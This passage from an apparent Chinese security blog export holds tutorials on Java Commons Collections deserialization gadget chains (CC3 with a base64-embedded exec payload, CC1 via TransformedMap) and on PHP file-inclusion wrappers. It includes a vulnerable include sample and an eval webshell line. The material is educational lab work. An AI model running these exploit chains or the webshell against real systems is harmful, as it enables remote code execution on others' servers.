class=\"line\">import java.lang.annotation.Target;</span><br><span class=\"line\">import java.lang.reflect.Constructor;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.nio.file.Files;</span><br><span class=\"line\">import java.nio.file.Paths;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @author shiyingai</span><br><span class=\"line\"> * @create 2023-03-09 15:04</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class CC3 &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\">        Templates templates = new TemplatesImpl();</span><br><span class=\"line\"></span><br><span class=\"line\">        /* 参数控制 */</span><br><span class=\"line\">        Class templatesClass = templates.getClass();</span><br><span class=\"line\">        // 修改 _name 参数</span><br><span class=\"line\">        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);</span><br><span class=\"line\">        nameField.setAccessible(true);</span><br><span class=\"line\">        nameField.set(templates,&quot;test&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 修改 _bytecodes 参数</span><br><span class=\"line\">        Field bytecodesFidld = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class=\"line\">        bytecodesFidld.setAccessible(true);</span><br><span class=\"line\">        // byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\JavaSecurity\\\\CC\\\\target\\\\classes\\\\RCE.class&quot;));</span><br><span class=\"line\">        byte[] code = Base64.decode(&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGlu\\n&quot; +</span><br><span class=\"line\">                &quot;aXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFi\\n&quot; +</span><br><span class=\"line\">                &quot;bGVUYWJsZQEABHRoaXMBAAVMUkNFOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9v\\n&quot; +</span><br><span class=\"line\">                &quot;cmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3Jn\\n&quot; +</span><br><span class=\"line\">                &quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu\\n&quot; +</span><br><span class=\"line\">                &quot;ZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p\\n&quot; +</span><br><span class=\"line\">                &quot;bnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2Fw\\n&quot; +</span><br><span class=\"line\">                &quot;YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxl\\n&quot; +</span><br><span class=\"line\">                &quot;cjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4v\\n&quot; +</span><br><span class=\"line\">                &quot;aW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVy\\n&quot; +</span><br><span class=\"line\">                &quot;bmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwv\\n&quot; +</span><br><span class=\"line\">                &quot;aW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0\\n&quot; +</span><br><span class=\"line\">                &quot;ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RU\\n&quot; +</span><br><span class=\"line\">                &quot;TUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94\\n&quot; +</span><br><span class=\"line\">                &quot;bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8\\n&quot; +</span><br><span class=\"line\">                &quot;Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRh\\n&quot; +</span><br><span class=\"line\">                &quot;YmxlBwApAQAKU291cmNlRmlsZQEACFJDRS5qYXZhDAAJAAoHAC4MAC8AMAEABGNh\\n&quot; +</span><br><span class=\"line\">                &quot;bGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEAA1JDRQEAQGNvbS9z\\n&quot; +</span><br><span class=\"line\">                &quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3Ry\\n&quot; +</span><br><span class=\"line\">                &quot;YWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwv\\n&quot; +</span><br><span class=\"line\">                &quot;eHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdl\\n&quot; +</span><br><span class=\"line\">                &quot;dFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZh\\n&quot; +</span><br><span class=\"line\">                &quot;L2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1Ry\\n&quot; +</span><br><span class=\"line\">                &quot;YWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAM\\n&quot; +</span><br><span class=\"line\">                &quot;AAAABgABAAAAEAANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAA\\n&quot; +</span><br><span class=\"line\">                &quot;AAGxAAAAAgAMAAAABgABAAAAHAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEA\\n&quot; +</span><br><span class=\"line\">                &quot;AAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAM\\n&quot; +</span><br><span class=\"line\">                &quot;AAAABgABAAAAIQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgAC\\n&quot; +</span><br><span class=\"line\">                &quot;AAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2\\n&quot; +</span><br><span class=\"line\">                &quot;AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAATAAkAFgAMABQADQAV\\n&quot; +</span><br><span class=\"line\">                &quot;ABEAFwANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj&quot;);</span><br><span class=\"line\">        byte[][] codes = &#123;code&#125;;</span><br><span class=\"line\">        bytecodesFidld.set(templates,codes);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 修改 _tfactory 参数（在序列化的时候，TemplatesImpl类的readObject方法会自动赋值）</span><br><span class=\"line\">        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class=\"line\">        tfactoryField.setAccessible(true);</span><br><span class=\"line\">        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        // templates.newTransformer();</span><br><span class=\"line\"></span><br><span class=\"line\">//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span><br><span class=\"line\">//        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transforms = new Transformer[]&#123;</span><br><span class=\"line\">                new ConstantTransformer(TrAXFilter.class),</span><br><span class=\"line\">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\">        map.put(&quot;value&quot;,&quot;value_test&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class=\"line\">        Constructor annotationInvocationHandlerConstructor =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class=\"line\">        annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class=\"line\">        Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Target.class,decorateMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(annotationInvocationHandlerObject);</span><br><span class=\"line\"></span><br><span class=\"line\">        unserialize(&quot;ser.bin&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 序列化</span><br><span class=\"line\">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class=\"line\">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 反序列化</span><br><span class=\"line\">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class=\"line\">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        return obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"调用链\"><a href=\"#调用链\" class=\"headerlink\" title=\"调用链\"></a>调用链</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-&gt;ObjectInputStream.readObject()</span><br><span class=\"line\">    -&gt;AnnotationInvocationHandler.readObject()</span><br><span class=\"line\">        -&gt;AnnotationInvocationHandler.setValue()</span><br><span class=\"line\">            -&gt;TransformedMap.checkSetValue()</span><br><span class=\"line\">                -&gt;ChainedTransformer.transform()</span><br><span class=\"line\">                    -&gt;ConstantTransformer.transform()</span><br><span class=\"line\">                        -&gt;InstantiateTransformer.transform()</span><br><span class=\"line\">                            -&gt;TrAXFilter.TrAXFilter()</span><br><span class=\"line\">                                -&gt;TemplatesImpl.newTransformer()</span><br><span class=\"line\">                                    -&gt;TemplatesImpl.getTransletInstance()</span><br><span class=\"line\">                                            -&gt;TemplatesImpl.defineTransletClasses()</span><br><span class=\"line\">                                                -&gt;TemplatesImpl.defineClass()</span><br></pre></td></tr></table></figure>\n\n","categories":["Java反序列化漏洞专题"],"tags":["CC链","Commons Collections","TemplatesImpl"]},{"title":"PHP伪协议-文件包含","url":"/2021/12/24/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","content":"<h2 id=\"lfi-php案例代码\"><a href=\"#lfi-php案例代码\" class=\"headerlink\" title=\"lfi.php案例代码\"></a>lfi.php案例代码</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tinclude $_GET[&#x27;file&#x27;];</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"phar-、zip-、zlib-协议特性\"><a href=\"#phar-、zip-、zlib-协议特性\" class=\"headerlink\" title=\"phar:&#x2F;&#x2F;、zip:&#x2F;&#x2F;、zlib:&#x2F;&#x2F; 协议特性\"></a>phar:&#x2F;&#x2F;、zip:&#x2F;&#x2F;、zlib:&#x2F;&#x2F; 协议特性</h2><p>​\t\t用于读取压缩文件，zip:&#x2F;&#x2F; 、phart:&#x2F;&#x2F; 、zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀: jpg、png、gif、xxx等等。</p>\n<h3 id=\"php-input\"><a href=\"#php-input\" class=\"headerlink\" title=\"php:&#x2F;&#x2F;input\"></a>php:&#x2F;&#x2F;input</h3><p>​\t\tphp:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。</p>\n<p><code>注:当enctype=&quot;multipart/form-data&quot;，php://input 是无效的。</code></p>\n<p><img src=\"/../images/image-20230918020512611.png\" alt=\"image-20230918020512611\"></p>\n<h3 id=\"zip\"><a href=\"#zip\" class=\"headerlink\" title=\"zip:&#x2F;&#x2F;\"></a>zip:&#x2F;&#x2F;</h3><p>​\t如果不允许上传zip格式文件，可修改后缀为图片格式，<strong>phar协议和zip协议会无视利用的是什么包。</strong><br> <code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名] (#编码为%23)</code></p>\n<p><img src=\"/../images/image-20230918020635478.png\" alt=\"image-20230918020635478\"></p>\n<p><img src=\"/../images/image-20230918020659405.png\" alt=\"image-20230918020659405\"></p>\n<h3 id=\"phar\"><a href=\"#phar\" class=\"headerlink\" title=\"phar:&#x2F;&#x2F;\"></a>phar:&#x2F;&#x2F;</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># shell.jpg</span><br><span class=\"line\">&lt;?php @eval($_REQUEST[1]);?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20230918020743413.png\" alt=\"image-20230918020743413\"></p>\n<h3 id=\"compress-zlib\"><a href=\"#compress-zlib\" class=\"headerlink\" title=\"compress.zlib:&#x2F;&#x2F;\"></a>compress.zlib:&#x2F;&#x2F;</h3><p><img src=\"/../images/image-20230918020820421.png\" alt=\"image-20230918020820421\"></p>\n<p><code>如果是zip压缩包，后面不需要跟子文件</code></p>\n<p><img src=\"/../images/image-20230918020840976.png\" alt=\"image-20230918020840976\"></p>\n<p><img src=\"/../images/image-20230918020853024.png\" alt=\"image-20230918020853024\"></p>\n<h3 id=\"data-text-plain\"><a href=\"#data-text-plain\" class=\"headerlink\" title=\"data:&#x2F;&#x2F;text&#x2F;plain\"></a>data:&#x2F;&#x2F;text&#x2F;plain</h3><p><img src=\"/../images/image-20230918020913453.png\" alt=\"image-20230918020913453\"></p>\n<p><img src=\"/../images/image-20230918020927543.png\" alt=\"image-20230918020927543\"></p>\n","categories":["PHP安全"],"tags":["PHP","伪协议","文件包含"]},{"title":"CC1-TransformdMap链","url":"/2023/03/01/CC1-TransformdMap%E9%93%BE/","content":"<h3 id=\"0-环境搭建\"><a href=\"#0-环境搭建\" class=\"headerlink\" title=\"0. 环境搭建\"></a>0. 环境搭建</h3><p>​\t\tApache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合) 相关类对象。</p>\n<p>Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。</p>\n<p><strong>包结构介绍</strong></p>\n<ul>\n<li>org.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类</li>\n<li>org.apache.commons.collections.bag – 实现Bag接口的一组类</li>\n<li>org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类</li>\n<li>org.apache.commons.collections.buffer – 实现Buffer接口的一组类</li>\n<li>org.apache.commons.collections.collection –实现java.util.Collection接口的一组类</li>\n<li>org.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类</li>\n<li>org.apache.commons.collections.functors –Commons Collections自定义的一组功能类</li>\n<li>org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类</li>\n<li>org.apache.commons.collections.keyvalue – 实现集合和键&#x2F;值映射相关的一组类</li>\n<li>org.apache.commons.collections.list – 实现java.util.List接口的一组类</li>\n<li>org.apache.commons.collections.map – 实现Map系列接口的一组类</li>\n<li>org.apache.commons.collections.set – 实现Set系列接口的一组类</li>\n</ul>\n<p>Commons Collections的maven仓库：<a href=\"https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1\">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1</a></p>\n<p>存在漏洞的版本：commons-collections 3.1-3.2.1；JDK 8u71之后已修复不可利⽤</p>\n<p>实验环境： JDK-8u65、commons-collections 3.2.1</p>\n<p>新建Maven项目，选择JDK-8u65</p>\n<p><img src=\"/../images/image-20240423231338923.png\" alt=\"image-20240423231338923\"></p>\n<p>修改pom.xml文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependencies&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240423231428535.png\" alt=\"image-20240423231428535\"></p>\n<p><img src=\"/../images/image-20240423232621575.png\" alt=\"image-20240423232621575\"></p>\n<p>​\t\t查看CC的依赖包，里面都是class字节码文件；如果想要看源码发现都是反编译过来的（变量名都是v1、v2之类的），无法进行直观的审计（都是class文件，另外使用find usages的时候，IDEA是不会去class文件查找的）</p>\n<p><img src=\"/../images/image-20240423232646963.png\" alt=\"image-20240423232646963\"></p>\n<p>JDK的源码不包含sun包，在JDK的src目录中加入sun源码包，sun目录从源码包：src&#x2F;share&#x2F;classes目录中拷贝到JDK的src目录下即可</p>\n<p><img src=\"/../images/image-20240423232719560.png\" alt=\"image-20240423232719560\"></p>\n<p>配置CC模块的JDK</p>\n<p><img src=\"/../images/image-20240423232734631.png\" alt=\"image-20240423232734631\"></p>\n<p>然后查看源码既可，以上环境就基本搭建好了</p>\n<p><img src=\"/../images/image-20240423232755015.png\" alt=\"image-20240423232755015\"></p>\n<h3 id=\"1-前置知识\"><a href=\"#1-前置知识\" class=\"headerlink\" title=\"1. 前置知识\"></a>1. 前置知识</h3><p>首先了解Java的命令执行：Runtime.getRuntime().exec(“calc”)</p>\n<ul>\n<li>普通调用</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240423232845987.png\" alt=\"image-20240423232845987\"></p>\n<ul>\n<li><p>反射调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class c = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class=\"line\">Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;);</span><br><span class=\"line\">Runtime r = (Runtime) getRuntimeMethod.invoke(c);</span><br><span class=\"line\">Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class=\"line\">execMethod.invoke(r,&quot;calc&quot;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240423232914787.png\" alt=\"image-20240423232914787\"></p>\n</li>\n</ul>\n<p>分析：</p>\n<p>在IDEA中，快捷键两次shift，搜索Runtime；发现getRuntime方法是public修饰的，返回类型是Runtime类型且无参</p>\n<p><img src=\"/../images/image-20240423232931291.png\" alt=\"image-20240423232931291\"></p>\n<p><strong>注：Runtime类是无法进行序列化的，因为没有实现Serializable接口</strong></p>\n<h3 id=\"2-实战\"><a href=\"#2-实战\" class=\"headerlink\" title=\"2. 实战\"></a>2. 实战</h3><p>​\t\t分析commons-collections.jar包中的InvokerTransformer.class类：该类中有个transform方法，如果input对象不为null的话，就会调用下图红框中的代码（可以反射调用input对象中的某个方法）；</p>\n<p>​\t\t那么如果想要命令执行的话，就可以传入Runtime类的exec方法。对比前面反射调用RCE的例子，那么transform方法的input参数就应该为Runtime.getRuntime。</p>\n<p><img src=\"/../images/image-20240423233046785.png\" alt=\"image-20240423233046785\"></p>\n<p>​\t继续分析InvokerTransformer.java类的构造方法：有两个构造方法，要想利用transform方法中的反射的话，就需要调用三个参数的构造方法</p>\n<p>​\t变量methodName赋值给iMethodName属性，paramTypes数组赋值给iParamTypes属性，args数组赋值给iArgs属性。这三个属性分别对应着要调用的方法名、方法参数类型</p>\n<p>方法的参数。</p>\n<p><img src=\"/../images/image-20240423233105644.png\" alt=\"image-20240423233105644\"></p>\n<p>构造POC</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1. 创建InvokerTransformer对象并调用transform方法</span><br><span class=\"line\">new InvokerTransformer().transform();</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 创建transform方法所需要的参数：Runtime.getRuntime()</span><br><span class=\"line\">Runtime r  = Runtime.getRuntime();    # 因为是静态方法，所以可以直接通过类名调用</span><br><span class=\"line\">new InvokerTransformer().transform(r);</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 分析构造方法传入相应的参数即可</span><br><span class=\"line\">Runtime r  = Runtime.getRuntime();</span><br><span class=\"line\">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br></pre></td></tr></table></figure>\n\n<p>执行弹出计算器；感觉构造方法和transform也太凑巧了，很像是在写一个后门</p>\n<p><img src=\"/../images/image-20240423233157177.png\" alt=\"image-20240423233157177\"></p>\n<p>​\t\t找到恶意利用点，接下来就可以构造链子了。查找哪里调用了transform方法（本质就是找入口，一直找到readObject方法即可），在TransformedMap类中找到checkSetValue方法，该方法调用了InvokerTransformer类的transform方法</p>\n<p>分析：</p>\n<p>​\t\t例如checkSetValue方法中调用了transform方法，而在某个类中的readObject方法中又调用了checkSetValue方法并且该类实现了序列化接口，可以被序列化，那么就可以把该类当成反序列化的入口了。</p>\n<p><img src=\"/../images/image-20240423233231183.png\" alt=\"image-20240423233231183\"></p>\n<p>​\t\t分析checkSetValue方法：直接返回valueTransformer对象的transform方法。跟踪valueTransformer对象，找到定义它的地方；最终在该类（TransformedMap类）的构造方法中找到有valueTransformer的定义</p>\n<p><img src=\"/../images/image-20240423233252002.png\" alt=\"image-20240423233252002\"></p>\n<ul>\n<li>自己的分析方法：</li>\n</ul>\n<p>​\t\t可以尝试通过反射的方法来动态构造TransformedMap类的对象，并把InvokerTransformer作为参数传入。（因为TransformedMap类的checkSetValue方法中的valueTransformer属性可以通过构造方法获得）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Runtime r  = Runtime.getRuntime();</span><br><span class=\"line\">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">Class TransformedMapClass =  TransformedMap.class;</span><br><span class=\"line\">Constructor TransformedMapMethod = TransformedMapClass.getDeclaredConstructor(Map.class,Transformer.class,Transformer.class);</span><br><span class=\"line\">TransformedMapMethod.setAccessible(true);</span><br><span class=\"line\">TransformedMap tmObject = (TransformedMap) TransformedMapMethod.newInstance(map,null,invokerTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">Method checkSetValueMethod = TransformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class);</span><br><span class=\"line\">checkSetValueMethod.setAccessible(true);</span><br><span class=\"line\">checkSetValueMethod.invoke(tmObject,r);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240423233401616.png\" alt=\"image-20240423233401616\"></p>\n<ul>\n<li>网上的分析方法：</li>\n</ul>\n<p>​\t\t因为如果想要通过TransformedMap类的构造方法传入InvokerTransformer对象的话，就需要创建TransformedMap对象。这里跟踪发现在前面有个静态方法：decorate；该方法中创建了TransformedMap对象。</p>\n<p><img src=\"/../images/image-20240423233342192.png\" alt=\"image-20240423233342192\"></p>\n<p>因为是静态方法，可以直接通过类名来调用，而不用通过反射。构造POC</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Runtime r  = Runtime.getRuntime();</span><br><span class=\"line\">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\">Map decorateMap = TransformedMap.decorate(map,null,invokerTransformer);     // TransformedMap类间接实现于Map接口</span><br><span class=\"line\"></span><br><span class=\"line\">Class TransformedMapClass = TransformedMap.class;</span><br><span class=\"line\">Method  checkSetValueMethod = TransformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class);</span><br><span class=\"line\">checkSetValueMethod.setAccessible(true);</span><br><span class=\"line\"></span><br><span class=\"line\">checkSetValueMethod.invoke(decorateMap,r);  // 这里的第一个参数：因为TransformedMap类调用decorate方法会返回当前类的对象，返回类型是Map</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240423233436297.png\" alt=\"image-20240423233436297\"></p>\n<p>跟踪到decorate方法，继续find useages，发现无法继续深入，没有对该decorate方法继续调用的地方。</p>\n<p><img src=\"/../images/image-20240423233456360.png\" alt=\"image-20240423233456360\"></p>\n<p>所以只能回到chekcSetValue方法中，重新寻找链子；在AbstractInputCheckedMapDecorator类的内部类MapEntry有个setValue方法调用了checkSetValue方法。</p>\n<p><img src=\"/../images/image-20240423233518500.png\" alt=\"image-20240423233518500\"></p>\n<p>继续往下分析：</p>\n<p>​\t\t跟踪到AbstractInputCheckedMapDecorator类，该类中有个内部类MapEntry的setValue方法里有对checkSetValue方法的调用。</p>\n<p><img src=\"/../images/image-20240423233535682.png\" alt=\"image-20240423233535682\"></p>\n<p>对Java熟悉的话，看到setVlaue可能会比较敏感；map接口中有对setValue方法的定义，setValue() <strong>实际上就是在 Map 中对一组 entry（键值对）</strong>进行 </p>\n<p>setValue() 操作。</p>\n<p>那么只需要对map即可进行遍历，就可以调用setValue方法间接调用checkSetValue方法。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">map.put(&quot;key&quot;, &quot;value&quot;);    // 键值对中要有东西，不然无法调用setValue方法</span><br><span class=\"line\">for (Map.Entry entry:decorateMap.entrySet()) &#123;  </span><br><span class=\"line\">    entry.setValue(r);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># 分析：</span><br><span class=\"line\">    decorate方法返回值是一个Map，该方法实际上类似于一个动态代理案例中的代理类，对Map传进来的key和value做一些处理；</span><br><span class=\"line\">因为decorate方法返回值是Map，那就可以对它进行遍历；entry保存的就是一个个的键值对；</span><br><span class=\"line\">TransformedMap类没有setValue方法，但是TransformedMap类继承于AbstractInputCheckedMapDecorator类，所以可以调用setValue方法</span><br></pre></td></tr></table></figure>\n\n<p>修改payload，如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Runtime r = Runtime.getRuntime(); </span><br><span class=\"line\">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;); </span><br><span class=\"line\">Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); </span><br><span class=\"line\">map.put(&quot;key&quot;,&quot;value&quot;); </span><br><span class=\"line\">Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null,invokerTransformer); // TransformedMap类间接实现于Map接口 </span><br><span class=\"line\">for (Map.Entry entry:decorateMap.entrySet())&#123; </span><br><span class=\"line\">    entry.setValue(r);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240423233716671.png\" alt=\"image-20240423233716671\"></p>\n<p>执行payload，弹出计算器</p>\n<p><img src=\"/../images/image-20240423233755182.png\" alt=\"image-20240423233755182\"></p>\n<p>攻击思路：</p>\n<p>​\t\t找到一个是Map的入口类，遍历这个集合，并执行 setValue 方法，即可构造 Poc。（如果一开始就能在一些readObject方法中找到可控对象（InvokerTransformer类）的transform方法，那这条链子就会很轻松；但是往往都是通过不断间接的调用，才构成链子）</p>\n<p>​\t\t继续跟踪setValue方法的调用，定位到JDK-8u65版本中的AnnotationInvocationHandler类的setValue方法（前面都是CC组件中的链子），并且该setValue方法是在readObject中的，AnnotationInvocationHandler类还实现了Serializable接口，可以被序列化。</p>\n<p>​\t\t该类中的setValue方法是通过memberValue调用的，参数memberValue又是通过memberValues集合获得的；那么只需要控制memberValues为TransformedMap类decorate方法的返回即可</p>\n<p><img src=\"/../images/image-20240423233820123.png\" alt=\"image-20240423233820123\"></p>\n<p>分析AnnotationInvocationHandler类的构造方法：</p>\n<p>​\t刚好memberValues参数通过构造方法传入，且该类和构造方法的作用域都是default，只能本类中调用；就需要通过反射来获取类及构造函数，再实例化它。</p>\n<p><img src=\"/../images/image-20240423233840214.png\" alt=\"image-20240423233840214\"></p>\n<p>通过反射，构造POC</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class annotationInvocationHandlerClass 